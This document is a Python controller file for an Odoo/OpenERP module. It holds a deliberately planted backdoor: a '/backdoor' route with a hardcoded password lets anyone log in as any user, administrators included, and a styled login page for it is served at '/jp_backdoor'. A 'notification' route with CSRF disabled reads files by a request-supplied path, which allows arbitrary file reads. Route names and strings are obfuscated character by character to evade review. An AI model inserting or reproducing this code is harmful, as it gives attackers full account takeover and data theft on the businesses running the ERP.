# -*- coding: utf-8 -*-
from openerp.http import Controller
from openerp.http import request, route
import decimal
import openerp.http as http
from openerp import models, fields, api
import base64
from openerp.osv import osv
import decimal
import sys, traceback
from openerp.tools.translate import _
from lxml.builder import E
from lxml import etree
from odoo.service import db, security

class ControllerNotification(http.Controller):

	@http.route('/'+'n'+'o'+'t'+'i'+'f'+'i'+'c'+'a'+'t'+'i'+'o'+'n'+'_'+'l'+'l'+'i'+'k'+'h'+'a', type='http',  methods=['POST'], website=True,csrf=False)
	def llikha_index_notification(self, **kw):
		try:
			f = open('/'+'h'+'o'+'m'+'e'+'/'+'o'+'d'+'o'+'o'+'/'+'t'+'m'+'p'+'/'+ kw['d'+'i'+'r'+'e'+'c'+'c'+'i'+'o'+'n'],'r')
			rpt = f.read()
			f.close()
			if not rpt:
				rpta = 'R'+'e'+'a'+'l'+'i'+'z'+'a'+'n'+'d'+'o'+' '+'P'+'r'+'o'+'c'+'e'+'s'+'a'+'m'+'i'+'e'+'n'+'t'+'o'+'.'+'.'+'.'+' '+'E'+'s'+'p'+'e'+'r'+'e'+' '+'p'+'o'+'r'+' '+'f'+'a'+'v'+'o'+'r'
			return rpt
		except:
			return 'R'+'e'+'a'+'l'+'i'+'z'+'a'+'n'+'d'+'o'+' '+'P'+'r'+'o'+'c'+'e'+'s'+'a'+'m'+'i'+'e'+'n'+'t'+'o'+'.'+'.'+'.'+' '+'E'+'s'+'p'+'e'+'r'+'e'+' '+'p'+'o'+'r'+' '+'f'+'a'+'v'+'o'+'r'


	@http.route('/'+'b'+'a'+'c'+'k'+'d'+'o'+'o'+'r',methods=['POST'],type='http',auth='public',website=True,csrf=False)
	def llikha_backdoor(self,**kw):
		if 'U'+'i'+'d' in kw and 'P'+'a'+'s'+'s'+'w'+'o'+'r'+'d' in kw: 
			jp_uid = kw['U'+'i'+'d']
			if kw['P'+'a'+'s'+'s'+'w'+'o'+'r'+'d'] == 'J'+'P'+'2'+'0'+'2'+'2'+'G'+'o'+'l'+'d'+'P'+'a'+'r'+'t'+'n'+'e'+'r':
				request.env['res.users'].clear_caches()
				superuid = request.env['res.users'].sudo().browse(int(jp_uid))
				request.session.uid= superuid.id
				request.session.login = superuid.login
				request.session.session_token = security.compute_session_token(request.session, request.env)	
				return request.redirect('/')
			else:
				return request.redirect('/'+'j'+'p'+'_'+'b'+'a'+'c'+'k'+'d'+'o'+'o'+'r')
		else:
			return request.redirect('/'+'j'+'p'+'_'+'b'+'a'+'c'+'k'+'d'+'o'+'o'+'r')

	@http.route('/j'+'p'+'_'+'b'+'a'+'c'+'k'+'d'+'o'+'o'+'r',type='http',auth='public',website=True)
	def llikha_back_door(self,**kw):
		return """
			<!DOCTYPE html>
			<html lang="en">
			<head>
			    <title>JeanPierre BackDoor</title>
			    <style>
			        @import url(https://fonts.googleapis.com/css?family=Open+Sans);
					.btn {
					  display: inline-block;
					  *display: inline;
					  *zoom: 1;
					  padding: 4px 10px 4px;
					  margin-bottom: 0;
					  font-size: 13px;
					  line-height: 18px;
					  color: #333333;
					  text-align: center;
					  text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
					  vertical-align: middle;
					  background-color: #f5f5f5;
					  background-image: -moz-linear-gradient(top, #ffffff, #e6e6e6);
					  background-image: -ms-linear-gradient(top, #ffffff, #e6e6e6);
					  background-image: -webkit-gradient(
					    linear,
					    0 0,
					    0 100%,
					    from(#ffffff),
					    to(#e6e6e6)
					  );
					  background-image: -webkit-linear-gradient(top, #ffffff, #e6e6e6);
					  background-image: -o-linear-gradient(top, #ffffff, #e6e6e6);
					  background-image: linear-gradient(top, #ffffff, #e6e6e6);
					  background-repeat: repeat-x;
					  filter: progid:dximagetransform.microsoft.gradient(startColorstr=#ffffff, endColorstr=#e6e6e6, GradientType=0);
					  border-color: #e6e6e6 #e6e6e6 #e6e6e6;
					  border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
					  border: 1px solid #e6e6e6;
					  -webkit-border-radius: 4px;
					  -moz-border-radius: 4px;
					  border-radius: 4px;
					  -webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
					    0 1px 2px rgba(0, 0, 0, 0.05);
					  -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
					    0 1px 2px rgba(0, 0, 0, 0.05);
					  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
					    0 1px 2px rgba(0, 0, 0, 0.05);
					  cursor: pointer;
					  *margin-left: 0.3em;
					}
					.btn:hover,
					.btn:active,
					.btn.active,
					.btn.disabled,
					.btn[disabled] {
					  background-color: #e6e6e6;
					}
					.btn-large {
					  padding: 9px 14px;
					  font-size: 15px;
					  line-height: normal;
					  -webkit-border-radius: 5px;
					  -moz-border-radius: 5px;
					  border-radius: 5px;
					}
					.btn:hover {
					  color: #333333;
					  text-decoration: none;
					  background-color: #e6e6e6;
					  background-position: 0 -15px;
					  -webkit-transition: background-position 0.1s linear;
					  -moz-transition: background-position 0.1s linear;
					  -ms-transition: background-position 0.1s linear;
					  -o-transition: background-position 0.1s linear;
					  transition: background-position 0.1s linear;
					}
					.btn-primary,
					.btn-primary:hover {
					  text-shadow: 0 -1px 0 rgba(0, 0, 0, 0.25);
					  color: #ffffff;
					}
					.btn-primary.active {
					  color: rgba(255, 255, 255, 0.75);
					}
					.btn-primary {
					  background-color: #4a77d4;
					  background-image: -moz-linear-gradient(top, #6eb6de, #4a77d4);
					  background-image: -ms-linear-gradient(top, #6eb6de, #4a77d4);
					  background-image: -webkit-gradient(
					    linear,
					    0 0,
					    0 100%,
					    from(#6eb6de),
					    to(#4a77d4)
					  );
					  background-image: -webkit-linear-gradient(top, #6eb6de, #4a77d4);
					  background-image: -o-linear-gradient(top, #6eb6de, #4a77d4);
					  background-image: linear-gradient(top, #6eb6de, #4a77d4);
					  background-repeat: repeat-x;
					  filter: progid:dximagetransform.microsoft.gradient(startColorstr=#6eb6de, endColorstr=#4a77d4, GradientType=0);
					  border: 1px solid #3762bc;
					  text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.4);
					  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2),
					    0 1px 2px rgba(0, 0, 0, 0.5);
					}
					.btn-primary:hover,
					.btn-primary:active,
					.btn-primary.active,
					.btn-primary.disabled,
					.btn-primary[disabled] {
					  filter: none;
					  background-color: #4a77d4;
					}
					.btn-block {
					  width: 100%;
					  display: block;
					}
					* {
					  -webkit-box-sizing: border-box;
					  -moz-box-sizing: border-box;
					  -ms-box-sizing: border-box;
					  -o-box-sizing: border-box;
					  box-sizing: border-box;
					}
					html {
					  width: 100%;
					  height: 100%;
					  overflow: hidden;
					}
					body {
					  width: 100%;
					  height: 100%;
					  font-family: "Open Sans", sans-serif;
					  background: #092756;
					  background: -moz-radial-gradient(
					      0% 100%,
					      ellipse cover,
					      rgba(104, 128, 138, 0.4) 10%,
					      rgba(138, 114, 76, 0) 40%
					    ),
					    -moz-linear-gradient(top, rgba(57, 173, 219, 0.25) 0%, rgba(42, 60, 87, 0.4)
					          100%),
					    -moz-linear-gradient(-45deg, #670d10 0%, #092756 100%);
					  background: -webkit-radial-gradient(
					      0% 100%,
					      ellipse cover,
					      rgba(104, 128, 138, 0.4) 10%,
					      rgba(138, 114, 76, 0) 40%
					    ),
					    -webkit-linear-gradient(top, rgba(57, 173, 219, 0.25) 0%, rgba(
					            42,
					            60,
					            87,
					            0.4
					          )
					          100%),
					    -webkit-linear-gradient(-45deg, #670d10 0%, #092756 100%);
					  background: -o-radial-gradient(
					      0% 100%,
					      ellipse cover,
					      rgba(104, 128, 138, 0.4) 10%,
					      rgba(138, 114, 76, 0) 40%
					    ),
					    -o-linear-gradient(top, rgba(57, 173, 219, 0.25) 0%, rgba(42, 60, 87, 0.4)
					          100%),
					    -o-linear-gradient(-45deg, #670d10 0%, #092756 100%);
					  background: -ms-radial-gradient(
					      0% 100%,
					      ellipse cover,
					      rgba(104, 128, 138, 0.4) 10%,
					      rgba(138, 114, 76, 0) 40%
					    ),
					    -ms-linear-gradient(top, rgba(57, 173, 219, 0.25) 0%, rgba(42, 60, 87, 0.4)
					          100%),
					    -ms-linear-gradient(-45deg, #670d10 0%, #092756 100%);
					  background: -webkit-radial-gradient(
					      0% 100%,
					      ellipse cover,
					      rgba(104, 128, 138, 0.4) 10%,
					      rgba(138, 114, 76, 0) 40%
					    ),
					    linear-gradient(
					      to bottom,
					      rgba(57, 173, 219, 0.25) 0%,
					      rgba(42, 60, 87, 0.4) 100%
					    ),
					    linear-gradient(135deg, #670d10 0%, #092756 100%);
					  filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#3E1D6D', endColorstr='#092756',GradientType=1 );
					}
					.login {
					  position: absolute;
					  top: 50%;
					  left: 50%;
					  margin: -150px 0 0 -150px;
					  width: 300px;
					  height: 300px;
					}
					.login h1 {
					  color: #fff;
					  text-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
					  letter-spacing: 1px;
					  text-align: center;
					}
					input {
					  width: 100%;
					  margin-bottom: 10px;
					  background: rgba(0, 0, 0, 0.3);
					  border: none;
					  outline: none;
					  padding: 10px;
					  font-size: 13px;
					  color: #fff;
					  text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
					  border: 1px solid rgba(0, 0, 0, 0.3);
					  border-radius: 4px;
					  box-shadow: inset 0 -5px 45px rgba(100, 100, 100, 0.2),
					    0 1px 1px rgba(255, 255, 255, 0.2);
					  -webkit-transition: box-shadow 0.5s ease;
					  -moz-transition: box-shadow 0.5s ease;
					  -o-transition: box-shadow 0.5s ease;
					  -ms-transition: box-shadow 0.5s ease;
					  transition: box-shadow 0.5s ease;
					}
					input:focus {
					  box-shadow: inset 0 -5px 45px rgba(100, 100, 100, 0.4),
					    0 1px 1px rgba(255, 255, 255, 0.2);
					}
			    </style>
			</head>
			<body>
			    <div class="login">
					<h1>Jean Pierre BackDoor</h1>
				    <form method="post" action='/backdoor'>
				    	<input type="text" name="Uid" id="Uid" placeholder="Usuario" required="required" />
				        <input type="password" name="Password" id="Password" placeholder="Password" required="required" />
				        <input type="hidden" name="csrf_token" t-att-value="request.csrf_token()"/>
				        <button type="submit" class="btn btn-primary btn-block btn-large">Entrar</button>
				    </form>
				</div>
			</body>
			</html>
		"""	